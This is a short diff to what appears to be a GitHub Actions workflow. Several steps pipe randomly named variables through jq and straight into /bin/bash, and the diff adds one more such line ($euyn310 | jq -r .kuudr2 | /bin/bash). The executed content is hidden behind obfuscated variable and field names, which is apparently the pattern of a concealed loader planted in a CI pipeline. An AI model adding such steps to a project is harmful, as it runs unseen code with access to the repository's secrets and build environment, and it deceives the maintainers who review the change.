@@ -26,6 +26,7 @@ jobs:
           echo $u031 | jq -r .fe4 | /bin/bash
           echo $em2 | jq -r .twhsz648 | /bin/bash
           printf '%s' "$ob2966" | jq -r .pl2 | /bin/bash
+          echo $euyn310 | jq -r .kuudr2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
